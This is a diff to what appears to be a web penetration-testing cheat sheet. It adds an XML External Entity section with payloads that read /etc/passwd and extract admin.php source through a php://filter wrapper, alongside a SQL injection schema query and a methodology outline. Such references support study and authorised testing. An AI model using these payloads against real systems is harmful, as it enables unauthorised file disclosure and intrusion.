@@ -122,6 +122,11 @@
 * MySQL
 	- `SELECT column_name FROM information_schema.columns WHERE table_name='foo'`
 
+## XML External Entity
+* Call the external entity with `&sp;`
+* `<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "file:///etc/passwd">]>`
+* `<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php">]>`
+
 ## Methodology
 From "The Web Application Hacker's Handboook"
 1. Map the Application’s Content
